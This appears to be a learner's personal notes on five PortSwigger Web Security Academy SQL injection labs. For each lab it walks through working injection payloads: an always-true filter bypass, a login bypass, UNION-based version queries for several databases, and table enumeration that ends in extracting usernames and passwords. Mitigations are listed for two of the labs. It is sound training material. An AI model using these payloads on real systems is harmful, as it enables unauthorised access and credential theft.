# SQL Injection – PortSwigger Labs Notes

These are my personal notes while solving PortSwigger Web Security Academy SQL injection labs.  
I focus on understanding the exploitation logic rather than memorizing payloads.

---

## Lab 1 – SQL injection in WHERE clause (retrieving hidden data)

###  Goal
Retrieve hidden/unreleased products.

###  Observations
The application uses a query similar to:

```sql
SELECT * FROM products
WHERE category = 'Gifts' AND released = 1;
```

###  Logic

 - We need to break out of the string context

 - Add a condition that always evaluates to TRUE

 - Comment out the rest of the query

This is how We bypass the released=1 filter and reveal the hidden data.

### Example request

The final injected request looked like:

```
?category=’ OR 1=1 --

```

### Mitigation

 - Parameterized queries (prepared statements)

 - Avoid dynamic SQL

 - Principle of least privilege

 - Restrict database metadata exposure

## Lab 2 – SQL injection allowing login bypass

###  Goal
Login as the administrator without knowing the password.

###  Observations
The backend likely runs a query such as:

```sql
SELECT * FROM users
WHERE username = 'INPUT'
AND password = 'INPUT';
```

###  Logic

 - Close the username string early

 - Comment out the password condition

 - Force the query to return the administrator record

I injected into the username field and successfully bypassed authentication.


## Lab 3 – Querying database type and version on Oracle

###  Goal 
Identify the database type and retrieve its version.

###  Key Oracle behavior

 - Oracle requires a valid table name in the FROM clause.

 - The dummy table dual is given us by the lab.

###  Step 1 – Determine column count
I used the ORDER BY technique:

```
ORDER BY 1
ORDER BY 2
ORDER BY 3
```
The query failed at index 3, indicating there are 2 columns.

###  Step 2 - Identify reflected columns
To determine which column reflects string output:

```sql
UNION SELECT 'abc', 'test' FROM dual
```
The column that reflects the injected string is the best place to inject the final payload.

###  Step 3 - Retrieve version info
Oracle version information can be queried from:

```
SELECT banner FROM v$version;
SELECT version FROM v$instance;
```
###  Result
Database version string extracted successfully.

###  Notes

 - Column count must match exactly

 - Data types must be compatible

 - Oracle is strict about query structure

## Lab 4 – Querying database type and version (MySQL & Microsoft SQL Server)

###  Lab Info
This lab contains a SQL injection vulnerability in the product category filter.  
A UNION-based injection can be used to retrieve data from an injected query.

###  Goal
Display the database version string.

###  Step 1 – Determine the number of columns
To use the UNION operator, both queries must return the same number of columns.
I first attempted the classic ORDER BY technique:

```sql
ORDER BY 1--
```

However, this caused an internal server error.
Since the payload was placed inside a URL parameter, I switched to using URL-encoded input and the # comment style instead.

The working request looked like:

```
Gifts'%20ORDER%20BY%201%23
```

###  Step 2 – Identify the correct column count
I incremented the index value:

```sql
ORDER BY 1
ORDER BY 2
ORDER BY 3
```

The query failed at index 3, which indicates that the original query has 2 columns.
I also observed that both columns were reflected on the page.

###  Step 3 – Retrieve database version
In both MySQL and Microsoft SQL Server, the database version can be retrieved using:

```sql
SELECT @@version
```

I replaced one of the UNION columns with a subquery:

```sql
UNION SELECT (SELECT @@version), 2#
```

###  Example Request

```
filter?category=Gifts' UNION SELECT (SELECT @@version),2%23
```

###  Notes

 - Column count must match exactly

 - URL encoding is often required for GET parameters

 - Comment characters may behave differently depending on the DBMS


## Lab 5 – Listing database contents (non-Oracle databases)

### Lab Info
This lab contains a SQL injection vulnerability in the product category filter.  
Query results are reflected in the response, which allows a UNION-based attack to retrieve data from other tables.

The application includes a login system, and the database stores usernames and passwords in a table.  
The objective is to identify this table and extract user credentials.

### Goal
Log in as the administrator user.


### Step 1 – Determine the number of columns
To use the UNION operator, both queries must return the same number of columns.
I used the ORDER BY technique:

```sql
ORDER BY 1
ORDER BY 2
ORDER BY 3
```

The query failed at index 3, indicating that the original query contains 2 columns.

### Step 2 – Identify reflected columns
To determine which columns accept string output, I tested with:

```sql
UNION SELECT NULL, NULL--
```

Both columns were reflected in the response, so either column could be used to inject data.

### Step 3 – Identify the database type
To understand which DBMS was in use, I tested common database functions.

```sql
UNION SELECT current_database(), 'test'--
```

This revealed that the application uses PostgreSQL.

### Step 4 – Enumerate table names
In PostgreSQL, table names can be retrieved from the information schema:

```sql
UNION SELECT table_name, 'a'
FROM information_schema.tables
WHERE table_schema = 'public'--
```

Filtering by table_schema = 'public' helps remove system tables.

I identified an interesting table:

```
users_duvcuz
```

### Step 5 – Enumerate column names
To list the columns of that table:

```sql
UNION SELECT column_name, 'a'
FROM information_schema.columns
WHERE table_name = 'users_duvcuz'--
```

Relevant columns:

 - username_ajmznc

 - password_sgqraj

### Step 6 – Extract credentials
Since both columns reflect output, I extracted usernames and passwords:

```sql
UNION SELECT username_ajmznc, password_sgqraj
FROM users_duvcuz--
```
### Result
Successfully retrieved user credentials and logged in as the administrator.

### Mitigation

 - Parameterized queries (prepared statements)

 - Avoid dynamic SQL

 - Principle of least privilege

 - Restrict database metadata exposure


